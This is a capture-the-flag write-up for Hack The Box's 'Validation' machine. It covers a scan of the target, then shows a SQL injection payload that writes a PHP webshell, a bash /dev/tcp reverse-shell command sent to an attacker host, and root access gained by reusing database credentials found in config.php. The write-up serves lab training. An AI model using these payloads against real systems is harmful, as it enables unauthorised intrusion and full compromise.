# Validation

## 1. Introduction

### 1.1 Background

The **Validation** machine from Hack The Box is an _Easy_ challenge focused on exploiting a **SQL Injection** vulnerability in a web application, with the goal of obtaining remote command execution and subsequently escalating privileges to the **root** user.

### 1.1 Objectives

Essential objectives of the _Validation_ machine (Hack The Box):

- Identify and exploit a SQL Injection vulnerability.
- Obtain initial access to the system through remote command execution.
- Escalate privileges to compromise the root account.

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by verifying connectivity:

```
❯ ping -c1 validation.htb
```

The host responded correctly, confirming that it was active on the network.

### 2.2 Nmap

A full port scan was performed to identify exposed services:

```
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 validation.htb -oN allports --open
```

Detected open ports:

- 22/tcp → SSH
- 80/tcp → HTTP
- 4566/tcp → HTTP (nginx)
- 8080/tcp → HTTP (nginx)

Afterwards, a more specific scan was executed to detect versions and run NSE scripts:

```
❯ nmap -p22,80,4566,8080 -sCV -Pn -oN targeted 10.129.95.235
```

Relevant results:

- **OpenSSH 8.2p1 (Ubuntu)** on port 22  
- **Apache 2.4.48 (Debian)** on port 80  
- Additional nginx services on ports 4566 and 8080  

When accessing port 80, a web application related to tournament registration is observed (“Join the UHC - September Qualifiers”).

<img width="764" height="486" alt="image" src="https://github.com/user-attachments/assets/3b69aef5-5941-492b-bee4-e6177675632f" />

## 3. Exploitation

### 3.1 SQL Injection Vulnerability 

Burp Suite was used to analyze HTTP requests sent by the application.

During testing of the `country` field, behavior vulnerable to **SQL Injection** was detected when sending:

```
username=tomas&country=Brazil' or 1=1-- -
```

The application responded by displaying all registered users, confirming a logic-based SQL injection.

Additionally, it was identified that the application uses PHP (`account.php`).

Taking advantage of the vulnerability, a `UNION SELECT` injection was performed to write a malicious file to the web server, creating a webshell accessible from the browser:

```
username=tomas&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/myshell.php"-- -
```

When accessing the created file at:

```
http://validation.htb/myshell.php
```

The following message was initially obtained:

```
Warning: system(): Cannot execute a blank command
```

This confirmed that command execution was possible.

It was observed that accessing:

```
http://validation.htb/myshell.php?cmd=id
```

Returned:

```
test1 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed remote command execution as the web server user.

Finally, a reverse shell was established, starting a listener with `nc` on the attacker machine:

```
sudo nc -lvnp 443
```

By executing:

```
http://validation.htb/myshell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/LHOST/443+0%3E%261%27
```

Interactive access to the system was obtained as `www-data`.

## 4. Privilege Escalation

Once inside the system, configuration files were reviewed in search of sensitive information.

The file:

```
/var/www/html/config.php
```

Contained database credentials:

```
$username = "uhc";
$password = "uhc-9qual-global-pw";
```

Password reuse was tested for the root user.

Authentication was successful, achieving full access to the system as **root**.
